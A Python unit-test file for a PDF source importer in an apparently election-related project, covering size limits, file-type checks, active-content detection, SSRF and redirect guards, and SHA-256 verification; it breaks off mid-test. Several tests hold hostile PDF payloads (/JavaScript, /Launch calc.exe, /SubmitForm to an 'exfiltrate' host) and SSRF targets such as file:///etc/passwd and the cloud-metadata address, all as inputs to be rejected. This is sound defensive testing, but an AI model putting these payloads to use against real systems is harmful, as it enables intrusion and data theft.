"""Unit and boundary tests for isolated offline source import and hash verification.

Covers:
- PDF/URL size boundaries (max limit, streamed bounds, Content-Length pre-check, empty/truncated files).
- Type and format validation (%PDF- magic bytes, polyglots, HTML, executables, scripts, MIME types).
- Active content security (rejection of /JavaScript, /Launch, /EmbeddedFiles, /SubmitForm, /ImportData).
- Zero source code execution (no eval, no shell, no dynamic evaluation).
- Network and SSRF guards (loopback, private RFC 1918, CGNAT, link-local, cloud metadata, scheme checks).
- Redirect security (max hops, redirect loops, redirect pivot to private IP).
- Timeouts and network failures (HTTP 4xx/5xx, timeouts, DNS errors, connection refusal).
- SHA-256 cryptographic hash checks (verification, mismatch diagnostics, format validation).
- Offline source register verification.
- Importer CLI commands.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import socket
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path
from typing import Any, Optional
from unittest import mock

from elecciones2026.importer import (
    DEFAULT_MAX_FILE_SIZE_BYTES,
    ActiveContentDetectedError,
    DisallowedHostError,
    DisallowedSchemeError,
    DNSResolutionError,
    EmptyFileError,
    HashMismatchError,
    HTTPStatusError,
    ImportConfig,
    ImportResult,
    InvalidFileFormatError,
    InvalidHashFormatError,
    NetworkSecurityError,
    NetworkTimeoutError,
    OfflineModeViolationError,
    RedirectSecurityError,
    SizeLimitExceededError,
    SourceImportError,
    SSRFSecurityError,
    compute_bytes_sha256,
    compute_file_sha256,
    fetch_url_with_limits,
    import_source_from_bytes,
    import_source_from_file,
    import_source_from_url,
    inspect_pdf_bytes,
    main as importer_cli_main,
    validate_sha256_format,
    validate_url,
    verify_hash,
    verify_register_sources_offline,
    verify_source_record,
)
from elecciones2026.source_register import RightsReview, SourceRecord, SourceRegister


def create_minimal_pdf_bytes(version: str = "1.4", extra_body: bytes = b"") -> bytes:
    """Generate syntactically clean, minimal PDF bytes without external dependencies."""
    pdf = (
        f"%PDF-{version}\n"
        f"1 0 obj\n"
        f"<< /Type /Catalog /Pages 2 0 R >>\n"
        f"endobj\n"
        f"2 0 obj\n"
        f"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
        f"endobj\n"
        f"3 0 obj\n"
        f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n"
        f"endobj\n"
    ).encode("ascii")
    if extra_body:
        pdf += extra_body + b"\n"
    pdf += (
        b"xref\n"
        b"0 4\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000058 00000 n \n"
        b"0000000115 00000 n \n"
        b"trailer\n"
        b"<< /Size 4 /Root 1 0 R >>\n"
        b"startxref\n"
        b"190\n"
        b"%%EOF\n"
    )
    return pdf


# ===========================================================================
# 1. Size Boundary Tests
# ===========================================================================


class TestSizeBoundaries(unittest.TestCase):
    """Test size limits, empty files, and streaming memory ceilings."""

    def test_valid_pdf_within_size_limit(self) -> None:
        data = create_minimal_pdf_bytes()
        res = import_source_from_bytes(data)
        self.assertEqual(res.status, "verified")
        self.assertEqual(res.size_bytes, len(data))
        self.assertFalse(res.active_content_detected)

    def test_oversized_bytes_buffer_rejected(self) -> None:
        cfg = ImportConfig(max_size_bytes=100)
        data = create_minimal_pdf_bytes()  # > 100 bytes
        with self.assertRaises(SizeLimitExceededError) as ctx:
            import_source_from_bytes(data, config=cfg)
        self.assertGreater(ctx.exception.current_size, 100)
        self.assertEqual(ctx.exception.max_size, 100)

    def test_oversized_file_rejected_before_full_read(self) -> None:
        cfg = ImportConfig(max_size_bytes=200)
        with tempfile.NamedTemporaryFile("wb", delete=False) as tmp:
            tmp.write(create_minimal_pdf_bytes() * 5)
            tmp_path = Path(tmp.name)
        try:
            with self.assertRaises(SizeLimitExceededError) as ctx:
                import_source_from_file(tmp_path, config=cfg)
            self.assertEqual(ctx.exception.max_size, 200)
        finally:
            tmp_path.unlink(missing_ok=True)

    def test_empty_file_rejected(self) -> None:
        with self.assertRaises(EmptyFileError) as ctx:
            import_source_from_bytes(b"")
        self.assertEqual(ctx.exception.current_size, 0)

    def test_sub_minimum_size_rejected(self) -> None:
        cfg = ImportConfig(min_size_bytes=8)
        with self.assertRaises(EmptyFileError):
            import_source_from_bytes(b"%PDF-1", config=cfg)

    def test_http_content_length_oversized_rejected_before_reading_body(self) -> None:
        cfg = ImportConfig(
            max_size_bytes=1000,
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        mock_resp = mock.MagicMock()
        mock_resp.status = 200
        mock_resp.headers = {"Content-Length": "50000", "Content-Type": "application/pdf"}

        mock_opener = mock.MagicMock()
        mock_opener.open.return_value = mock_resp

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(SizeLimitExceededError) as ctx:
                fetch_url_with_limits("https://example.org/huge.pdf", config=cfg)
            self.assertIn("Content-Length header", str(ctx.exception))
            # Verify body read was never called
            mock_resp.read.assert_not_called()

    def test_http_streamed_unannounced_oversized_payload_aborts_mid_stream(self) -> None:
        cfg = ImportConfig(
            max_size_bytes=500,
            chunk_size=100,
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        # Mock stream yielding 100 bytes indefinitely (e.g. infinite stream/zip bomb)
        mock_resp = mock.MagicMock()
        mock_resp.status = 200
        mock_resp.headers = {"Content-Type": "application/pdf"}  # No Content-Length
        mock_resp.read.side_effect = [b"A" * 100] * 10

        mock_opener = mock.MagicMock()
        mock_opener.open.return_value = mock_resp

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(SizeLimitExceededError) as ctx:
                fetch_url_with_limits("https://example.org/stream.pdf", config=cfg)
            self.assertIn("mid-stream", str(ctx.exception))
            mock_resp.close.assert_called_once()


# ===========================================================================
# 2. Type and Format Tests
# ===========================================================================


class TestTypeAndFormat(unittest.TestCase):
    """Test magic byte checks, PDF version parsing, and polyglot/executable rejection."""

    def test_valid_pdf_versions_parsed(self) -> None:
        for ver in ("1.4", "1.7", "2.0"):
            data = create_minimal_pdf_bytes(version=ver)
            res = import_source_from_bytes(data)
            self.assertEqual(res.pdf_version, ver)

    def test_missing_pdf_header_rejected(self) -> None:
        data = b"This is just a plain text document pretending to be a PDF."
        with self.assertRaises(InvalidFileFormatError) as ctx:
            import_source_from_bytes(data)
        self.assertIn("Missing required '%PDF-' magic bytes", str(ctx.exception))

    def test_html_document_rejected(self) -> None:
        html_data = b"<!DOCTYPE html><html><head><title>Vote</title></head><body>Fake</body></html>"
        with self.assertRaises(InvalidFileFormatError) as ctx:
            import_source_from_bytes(html_data)
        self.assertIn("polyglot/executable disguise", str(ctx.exception))

    def test_shell_script_rejected(self) -> None:
        script = b"#!/bin/bash\necho 'malicious code'\nexit 0"
        with self.assertRaises(InvalidFileFormatError) as ctx:
            import_source_from_bytes(script)
        self.assertIn("polyglot/executable disguise", str(ctx.exception))

    def test_windows_pe_executable_rejected(self) -> None:
        pe_data = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 60
        with self.assertRaises(InvalidFileFormatError):
            import_source_from_bytes(pe_data)

    def test_linux_elf_executable_rejected(self) -> None:
        elf_data = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 60
        with self.assertRaises(InvalidFileFormatError):
            import_source_from_bytes(elf_data)

    def test_zip_archive_rejected(self) -> None:
        zip_data = b"PK\x03\x04\x14\x00\x00\x00" + b"\x00" * 60
        with self.assertRaises(InvalidFileFormatError):
            import_source_from_bytes(zip_data)

    def test_polyglot_executable_prefixed_rejected(self) -> None:
        # A file starting with executable header but containing %PDF- later
        polyglot = b"MZ\x90\x00" + b"\x00" * 20 + create_minimal_pdf_bytes()
        with self.assertRaises(InvalidFileFormatError):
            import_source_from_bytes(polyglot)

    def test_foreign_preceding_data_before_pdf_header_rejected(self) -> None:
        # Some junk characters before %PDF-
        corrupt = b"JUNK_DATA_HERE\n" + create_minimal_pdf_bytes()
        with self.assertRaises(InvalidFileFormatError) as ctx:
            import_source_from_bytes(corrupt)
        self.assertIn("foreign data preceding %PDF-", str(ctx.exception))

    def test_http_disallowed_content_type_rejected(self) -> None:
        cfg = ImportConfig(
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )
        mock_resp = mock.MagicMock()
        mock_resp.status = 200
        mock_resp.headers = {"Content-Type": "text/html; charset=utf-8"}
        mock_resp.read.side_effect = [b"<html>not a pdf</html>", b""]

        mock_opener = mock.MagicMock()
        mock_opener.open.return_value = mock_resp

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(InvalidFileFormatError) as ctx:
                fetch_url_with_limits("https://example.org/page.html", config=cfg)
            self.assertIn("Content-Type 'text/html' is not an approved PDF type", str(ctx.exception))


# ===========================================================================
# 3. Active Content and Zero Source Code Execution Tests
# ===========================================================================


class TestActiveContentAndNoCodeExecution(unittest.TestCase):
    """Test detection of embedded JavaScript, /Launch actions, and verification of zero execution."""

    def test_clean_pdf_without_active_content_accepted(self) -> None:
        data = create_minimal_pdf_bytes()
        ver, findings = inspect_pdf_bytes(data)
        self.assertEqual(ver, "1.4")
        self.assertEqual(findings, [])

    def test_pdf_with_javascript_action_rejected(self) -> None:
        js_payload = b"4 0 obj\n<< /S /JavaScript /JS (app.alert('exploit')) >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=js_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("javascript" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_short_js_action_rejected(self) -> None:
        js_payload = b"4 0 obj\n<< /Type /Action /S /JS /JS (this.print()) >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=js_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("/js" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_hex_obfuscated_javascript_name_rejected(self) -> None:
        # /Java#53cript -> decodes to /JavaScript (#53 = 'S')
        obfuscated = b"4 0 obj\n<< /S /Java#53cript /JS (alert(1)) >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=obfuscated)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("javascript" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_launch_os_command_action_rejected(self) -> None:
        launch_payload = b"4 0 obj\n<< /S /Launch /F << /Type /Filespec /F (calc.exe) >> >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=launch_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("launch" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_embedded_files_rejected(self) -> None:
        embedded_payload = b"4 0 obj\n<< /Type /Catalog /EmbeddedFiles 5 0 R >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=embedded_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("embeddedfiles" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_submit_form_rejected(self) -> None:
        submit_payload = b"4 0 obj\n<< /S /SubmitForm /F (https://exfiltrate.org/data) >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=submit_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("submitform" in f.lower() for f in ctx.exception.findings))

    def test_pdf_with_import_data_rejected(self) -> None:
        import_payload = b"4 0 obj\n<< /S /ImportData /F (data.fdf) >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=import_payload)
        with self.assertRaises(ActiveContentDetectedError) as ctx:
            import_source_from_bytes(data)
        self.assertTrue(any("importdata" in f.lower() for f in ctx.exception.findings))

    def test_disallow_active_content_flag_disabled_records_findings(self) -> None:
        js_payload = b"4 0 obj\n<< /S /JavaScript >>\nendobj"
        data = create_minimal_pdf_bytes(extra_body=js_payload)
        cfg = ImportConfig(disallow_active_content=False)
        res = import_source_from_bytes(data, config=cfg)
        self.assertEqual(res.status, "verified")
        self.assertTrue(res.active_content_detected)
        self.assertGreater(len(res.active_content_findings), 0)

    def test_zero_source_code_execution_verified(self) -> None:
        """Verify that importing never calls eval, exec, or subprocess."""
        data = create_minimal_pdf_bytes()
        with mock.patch("subprocess.run") as mock_sub, mock.patch("subprocess.Popen") as mock_pop:
            res = import_source_from_bytes(data)
            self.assertEqual(res.status, "verified")
            mock_sub.assert_not_called()
            mock_pop.assert_not_called()


# ===========================================================================
# 4. Network and SSRF Security Tests
# ===========================================================================


class TestNetworkAndSSRF(unittest.TestCase):
    """Test URL scheme rules, port limits, and comprehensive SSRF blocking."""

    def test_valid_public_https_url_passes(self) -> None:
        with mock.patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
            ]
            ips = validate_url("https://example.com/programa.pdf")
            self.assertEqual(ips, ["93.184.216.34"])

    def test_disallowed_scheme_http_when_https_required(self) -> None:
        with self.assertRaises(DisallowedSchemeError) as ctx:
            validate_url("http://example.com/programa.pdf")
        self.assertEqual(ctx.exception.scheme, "http")

    def test_disallowed_schemes_rejected(self) -> None:
        for unsafe in (
            "file:///etc/passwd",
            "ftp://files.example.com/doc.pdf",
            "gopher://gopher.example.com/1",
            "javascript:alert(1)",
            "data:text/plain;base64,AAAA",
        ):
            with self.assertRaises(DisallowedSchemeError):
                validate_url(unsafe)

    def test_url_with_credentials_rejected(self) -> None:
        with self.assertRaises(DisallowedHostError) as ctx:
            validate_url("https://admin:secret@example.com/programme.pdf")
        self.assertIn("credentials", ctx.exception.reason)

    def test_ssrf_ipv4_loopback_rejected(self) -> None:
        for loopback in ("https://127.0.0.1/doc.pdf", "https://127.1.2.3/doc.pdf"):
            with self.assertRaises(SSRFSecurityError):
                validate_url(loopback)

    def test_ssrf_ipv6_loopback_rejected(self) -> None:
        with self.assertRaises(SSRFSecurityError):
            validate_url("https://[::1]/doc.pdf")

    def test_ssrf_hostname_localhost_rejected(self) -> None:
        for host in ("https://localhost/doc.pdf", "https://localhost.localdomain/doc.pdf"):
            with self.assertRaises(SSRFSecurityError):
                validate_url(host)

    def test_ssrf_hostname_internal_suffixes_rejected(self) -> None:
        for target in (
            "https://server.local/doc.pdf",
            "https://app.internal/doc.pdf",
            "https://service.lan/doc.pdf",
            "https://nas.home/doc.pdf",
        ):
            with self.assertRaises(SSRFSecurityError):
                validate_url(target)

    def test_ssrf_rfc1918_private_networks_rejected(self) -> None:
        for private_ip in (
            "https://10.0.0.1/doc.pdf",
            "https://10.255.255.254/doc.pdf",
            "https://172.16.0.1/doc.pdf",
            "https://172.31.255.255/doc.pdf",
            "https://192.168.0.1/doc.pdf",
            "https://192.168.100.50/doc.pdf",
        ):
            with self.assertRaises(SSRFSecurityError):
                validate_url(private_ip)

    def test_ssrf_cgnat_rejected(self) -> None:
        with self.assertRaises(SSRFSecurityError):
            validate_url("https://100.64.0.1/doc.pdf")

    def test_ssrf_cloud_metadata_link_local_rejected(self) -> None:
        for link_local in (
            "https://169.254.169.254/latest/meta-data/",
            "https://169.254.1.1/doc.pdf",
        ):
            with self.assertRaises(SSRFSecurityError):
                validate_url(link_local)

    def test_ssrf_ipv6_ula_private_rejected(self) -> None:
        with self.assertRaises(SSRFSecurityError):
            validate_url("https://[fc00::1]/doc.pdf")

    def test_ssrf_ipv6_link_local_rejected(self) -> None:
        with self.assertRaises(SSRFSecurityError):
            validate_url("https://[fe80::1]/doc.pdf")

    def test_ssrf_unspecified_0000_rejected(self) -> None:
        with self.assertRaises(SSRFSecurityError):
            validate_url("https://0.0.0.0/doc.pdf")

    def test_ssrf_dns_resolution_to_private_ip_rejected(self) -> None:
        with mock.patch("socket.getaddrinfo") as mock_dns:
            # Resolves an innocent-looking domain to an internal RFC 1918 address
            mock_dns.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.1.100", 443))
            ]
            with self.assertRaises(SSRFSecurityError) as ctx:
                validate_url("https://evil-rebinding.example.com/doc.pdf")
            self.assertIn("192.168.1.100", ctx.exception.ip_address)

    def test_disallowed_non_standard_ports_rejected(self) -> None:
        with self.assertRaises(DisallowedHostError):
            validate_url("https://example.com:8080/doc.pdf")

    def test_offline_mode_blocks_any_fetch_request(self) -> None:
        cfg = ImportConfig(offline_only=True)
        with self.assertRaises(OfflineModeViolationError) as ctx:
            fetch_url_with_limits("https://example.com/programme.pdf", config=cfg)
        self.assertIn("offline-only mode", str(ctx.exception))


# ===========================================================================
# 5. Redirect and Network Boundary Tests
# ===========================================================================


class TestRedirectAndNetworkBoundaries(unittest.TestCase):
    """Test HTTP redirect handling, SSRF re-check on redirect, and redirect limits."""

    def test_safe_redirect_followed_and_verified(self) -> None:
        cfg = ImportConfig(
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        mock_redirect_err = urllib.error.HTTPError(
            url="https://example.org/initial",
            code=302,
            msg="Found",
            hdrs={"Location": "https://example.org/target.pdf"},
            fp=None,
        )

        pdf_bytes = create_minimal_pdf_bytes()
        mock_final_resp = mock.MagicMock()
        mock_final_resp.status = 200
        mock_final_resp.headers = {
            "Content-Type": "application/pdf",
            "Content-Length": str(len(pdf_bytes)),
        }
        mock_final_resp.read.side_effect = [pdf_bytes, b""]

        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = [mock_redirect_err, mock_final_resp]

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            content, meta = fetch_url_with_limits("https://example.org/initial", config=cfg)
            self.assertEqual(content, pdf_bytes)
            self.assertEqual(meta["final_url"], "https://example.org/target.pdf")
            self.assertEqual(meta["redirect_history"], ["https://example.org/initial"])

    def test_redirect_to_private_ip_blocked_immediately(self) -> None:
        cfg = ImportConfig(
            allow_loopback_for_testing=False,
            disallow_private_ips=True,
        )

        # Redirect target attempts SSRF pivot to loopback / internal metadata
        mock_redirect_err = urllib.error.HTTPError(
            url="https://example.org/initial",
            code=302,
            msg="Found",
            hdrs={"Location": "https://127.0.0.1/internal-secret.pdf"},
            fp=None,
        )

        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = [mock_redirect_err]

        with mock.patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
            ]
            with mock.patch("urllib.request.build_opener", return_value=mock_opener):
                with self.assertRaises(SSRFSecurityError) as ctx:
                    fetch_url_with_limits("https://example.org/initial", config=cfg)
                self.assertIn("127.0.0.1", str(ctx.exception))

    def test_redirect_cycle_rejected(self) -> None:
        cfg = ImportConfig(
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        mock_redirect_1 = urllib.error.HTTPError(
            url="https://example.org/a",
            code=302,
            msg="Found",
            hdrs={"Location": "https://example.org/b"},
            fp=None,
        )
        mock_redirect_2 = urllib.error.HTTPError(
            url="https://example.org/b",
            code=302,
            msg="Found",
            hdrs={"Location": "https://example.org/a"},
            fp=None,
        )

        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = [mock_redirect_1, mock_redirect_2]

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(RedirectSecurityError) as ctx:
                fetch_url_with_limits("https://example.org/a", config=cfg)
            self.assertIn("Redirect cycle detected", str(ctx.exception))

    def test_max_redirects_exceeded_rejected(self) -> None:
        cfg = ImportConfig(
            max_redirects=2,
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        def make_redirect(from_url: str, to_url: str) -> urllib.error.HTTPError:
            return urllib.error.HTTPError(
                url=from_url,
                code=302,
                msg="Found",
                hdrs={"Location": to_url},
                fp=None,
            )

        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = [
            make_redirect("https://example.org/1", "https://example.org/2"),
            make_redirect("https://example.org/2", "https://example.org/3"),
            make_redirect("https://example.org/3", "https://example.org/4"),
        ]

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(RedirectSecurityError) as ctx:
                fetch_url_with_limits("https://example.org/1", config=cfg)
            self.assertIn("Exceeded maximum allowed redirects (2)", str(ctx.exception))


# ===========================================================================
# 6. Time and Timeout Tests
# ===========================================================================


class TestTimeouts(unittest.TestCase):
    """Test connection and read socket timeout handling."""

    def test_connection_timeout_handled(self) -> None:
        cfg = ImportConfig(
            timeout_seconds=5.0,
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = socket.timeout("timed out")

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(NetworkTimeoutError) as ctx:
                fetch_url_with_limits("https://example.org/slow.pdf", config=cfg)
            self.assertEqual(ctx.exception.timeout_seconds, 5.0)

    def test_streaming_read_timeout_handled(self) -> None:
        cfg = ImportConfig(
            timeout_seconds=2.0,
            allow_loopback_for_testing=True,
            disallow_private_ips=False,
        )

        mock_resp = mock.MagicMock()
        mock_resp.status = 200
        mock_resp.headers = {"Content-Type": "application/pdf"}
        mock_resp.read.side_effect = socket.timeout("timed out during read")

        mock_opener = mock.MagicMock()
        mock_opener.open.return_value = mock_resp

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(NetworkTimeoutError) as ctx:
                fetch_url_with_limits("https://example.org/stalled.pdf", config=cfg)
            self.assertEqual(ctx.exception.timeout_seconds, 2.0)


# ===========================================================================
# 7. Cryptographic SHA-256 Hash Tests
# ===========================================================================


class TestCryptographicHashChecks(unittest.TestCase):
    """Test cryptographic SHA-256 validation, formatting, and mismatch diagnostics."""

    def test_matching_sha256_hash_verified(self) -> None:
        data = create_minimal_pdf_bytes()
        expected = hashlib.sha256(data).hexdigest()
        res = import_source_from_bytes(data, expected_hash=expected)
        self.assertEqual(res.status, "verified")
        self.assertEqual(res.sha256, expected)

    def test_mismatched_sha256_hash_raises_error(self) -> None:
        data = create_minimal_pdf_bytes()
        bogus_hash = "0" * 64
        with self.assertRaises(HashMismatchError) as ctx:
            import_source_from_bytes(data, expected_hash=bogus_hash, source_id="src-test-01")
        self.assertIn("src-test-01", str(ctx.exception))
        self.assertEqual(ctx.exception.expected_hash, bogus_hash)
        self.assertNotEqual(ctx.exception.computed_hash, bogus_hash)

    def test_malformed_sha256_hash_format_rejected(self) -> None:
        data = create_minimal_pdf_bytes()
        for bad_hash in ("12345", "not_a_hash", "z" * 64, "a" * 63, "a" * 65):
            with self.assertRaises(InvalidHashFormatError):
                import_source_from_bytes(data, expected_hash=bad_hash)

    def test_uppercase_sha256_normalized_and_verified(self) -> None:
        data = create_minimal_pdf_bytes()
        expected = hashlib.sha256(data).hexdigest().upper()
        res = import_source_from_bytes(data, expected_hash=expected)
        self.assertEqual(res.sha256, expected.lower())

    def test_constant_memory_file_sha256_matches(self) -> None:
        data = create_minimal_pdf_bytes() * 10
        expected = hashlib.sha256(data).hexdigest()
        with tempfile.NamedTemporaryFile("wb", delete=False) as tmp:
            tmp.write(data)
            tmp_path = Path(tmp.name)
        try:
            computed = compute_file_sha256(tmp_path, chunk_size=32)
            self.assertEqual(computed, expected)
        finally:
            tmp_path.unlink(missing_ok=True)


# ===========================================================================
# 8. Failure Mode Tests
# ===========================================================================


class TestFailureModes(unittest.TestCase):
    """Test HTTP 4xx/5xx, DNS resolution errors, and filesystem failure states."""

    def test_http_404_not_found_handled(self) -> None:
        cfg = ImportConfig(allow_loopback_for_testing=True, disallow_private_ips=False)
        mock_err = urllib.error.HTTPError(
            url="https://example.org/missing.pdf",
            code=404,
            msg="Not Found",
            hdrs={},
            fp=None,
        )
        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = mock_err

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(HTTPStatusError) as ctx:
                fetch_url_with_limits("https://example.org/missing.pdf", config=cfg)
            self.assertEqual(ctx.exception.status_code, 404)

    def test_http_500_server_error_handled(self) -> None:
        cfg = ImportConfig(allow_loopback_for_testing=True, disallow_private_ips=False)
        mock_err = urllib.error.HTTPError(
            url="https://example.org/crash.pdf",
            code=500,
            msg="Internal Server Error",
            hdrs={},
            fp=None,
        )
        mock_opener = mock.MagicMock()
        mock_opener.open.side_effect = mock_err

        with mock.patch("urllib.request.build_opener", return_value=mock_opener):
            with self.assertRaises(HTTPStatusError) as ctx:
                fetch_url_with_limits("https://example.org/crash.pdf", config=cfg)
            self.assertEqual(ctx.exception.status_code, 500)

    def test_dns_resolution_failure_handled(self) -> None:
        with mock.patch("socket.getaddrinfo", side_effect=socket.gaierror(-2, "Name or service not known")):
            with self.assertRaises(DNSResolutionError) as ctx:
                validate_url("https://nonexistent-domain-xyz123.org/doc.pdf")
            self.assertIn("nonexistent-domain-xyz123.org", ctx.exception.hostname)

    def test_local_file_not_found_handled(self) -> None:
        with self.assertRaises(FileNotFoundError):
            import_source_from_file("/path/to/definitely/nonexistent/file.pdf")

    def test_directory_passed_as_file_handled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            with self.assertRaises(SourceImportError):
                import_source_from_file(tmp_dir)


# ===========================================================================
# 9. Source Register Integration Tests
# ===========================================================================


class TestSourceRegisterIntegration(unittest.TestCase):
    """Test verifying SourceRecord instances and batch offline source directory verification."""

    def test_verify_source_record_with_valid_file(self) -> None:
        data = create_minimal_pdf_bytes()
        sha = hashlib.sha256(data).hexdigest()

        with tempfile.NamedTemporaryFile("wb", suffix=".pdf", delete=False) as tmp:
            tmp.write(data)
            tmp_path = Path(tmp.name)

        try:
            source = SourceRecord(
                id="src-test-v1",
                election_id="es-gen-2023",
                party_id="test",
                candidature_name="Test Party",
                publisher="Test Publisher",
                scope="general",
                official_url="https://example.org/info",
                direct_url="https://example.org/doc.pdf",
                filename=tmp_path.name,
                publication_date="2023-07-01",
                retrieval_date="2026-10-09",
                language="es",
                version="1.0",
                sha256=sha,
                status="verified",
                rights_review=RightsReview(
                    status="link_and_short_quote",
                    reviewed_by="editor",
                    review_date="2026-10-09",
                    terms_notes="Lawful quotation under Art 32.",
                ),
                replacement_history=[],
                notes="Pilot source",
            )

            res = verify_source_record(source, file_path=tmp_path)
            self.assertEqual(res.status, "verified")
            self.assertEqual(res.sha256, sha)
        finally:
            tmp_path.unlink(missing_ok=True)

    def test_verify_register_sources_offline_success(self) -> None:
        # Create offline fixture files for the registered pilot programmes
        with tempfile.TemporaryDirectory() as storage_dir:
            storage_path = Path(storage_dir)

            # Generate fixture files with exact registered hashes
            p1_bytes = create_minimal_pdf_bytes(version="1.4")
            p1_hash = hashlib.sha256(p1_bytes).hexdigest()
            p1_file = storage_path / "programme_p1.pdf"
            p1_file.write_bytes(p1_bytes)

            source = SourceRecord(
                id="src-p1",
                election_id="es-gen-2023",
                party_id="p1",
                candidature_name="Party One",
                publisher="P1",
                scope="general",
                official_url="https://example.org/p1",
                direct_url="https://example.org/p1.pdf",
                filename="programme_p1.pdf",
                publication_date="2023-07-01",
                retrieval_date="2026-10-09",
                language="es",
                version="1.0",
                sha256=p1_hash,
                status="verified",
                rights_review=RightsReview(
                    status="link_and_short_quote",
                    reviewed_by="auditor",
                    review_date="2026-10-09",
                    terms_notes="Reviewed",
                ),
                replacement_history=[],
                notes="",
            )

            reg = SourceRegister(
                version="1.0.0",
                last_updated="2026-10-09",
                description="Test",
                elections=[],
                sources=[source],
            )

            results = verify_register_sources_offline(reg, storage_path)
            self.assertIn("src-p1", results)
            self.assertEqual(results["src-p1"].status, "verified")
            self.assertEqual(results["src-p1"].sha256, p1_hash)

    def test_verify_register_missing_offline_file_raises_error(self) -> None:
        with tempfile.TemporaryDirectory() as empty_dir:
            source = SourceRecord(
                id="src-missing",
                election_id="es-gen-2023",
                party_id="p1",
                candidature_name="Party",
                publisher="Publisher",
                scope="general",
                official_url="https://example.org/",
                direct_url="https://example.org/p.pdf",
                filename="nonexistent.pdf",
                publication_date="2023-07-01",
                retrieval_date="2026-10-09",
                language="es",
                version="1.0",
                sha256="a" * 64,
                status="verified",
                rights_review=RightsReview(
                    status="link_and_short_quote",
                    reviewed_by="ed",
                    review_date="2026-10-09",
                    terms_notes="",
                ),
                replacement_history=[],
                notes="",
            )
            reg = SourceRegister(
                version="1.0.0",
                last_updated="2026-10-09",
                description="Test",
                elections=[],
                sources=[source],
            )

            with self.assertRaises(FileNotFoundError):
                verify_register_sources_offline(reg, empty_dir)


# ===========================================================================
# 10. CLI Command Tests
# ===========================================================================


class TestImporterCLI(unittest.TestCase):
    """Test importer CLI entrypoint and subcommand dispatch."""

    def test_cli_verify_file_success(self) -> None:
        data = create_minimal_pdf_bytes()
        sha = hashlib.sha256(data).hexdigest()

        with tempfile.NamedTemporaryFile("wb", suffix=".pdf", delete=False) as tmp:
            tmp.write(data)
            tmp_path = Path(tmp.name)

        try:
            with mock.patch("sys.argv", ["importer", "verify-file", str(tmp_path), "--expected-hash", sha]):
                with self.assertRaises(SystemExit) as ctx:
                    importer_cli_main()
                self.assertEqual(ctx.exception.code, 0)
        finally:
            tmp_path.unlink(missing_ok=True)

    def test_cli_verify_file_hash_mismatch_fails(self) -> None:
        data = create_minimal_pdf_bytes()
        bogus_sha = "f" * 64

        with tempfile.NamedTemporaryFile("wb", suffix=".pdf", delete=False) as tmp:
            tmp.write(data)
            tmp_path = Path(tmp.name)

        try:
            with mock.patch("sys.argv", ["importer", "verify-file", str(tmp_path), "--expected-hash", bogus_sha]):
                with self.assertRaises(SystemExit) as ctx:
                    importer_cli_main()
                self.assertEqual(ctx.exception.code, 1)
        finally:
            tmp_path.unlink(missing_ok=True)

    def test_cli_check_url_safe(self) -> None:
        with mock.patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
            ]
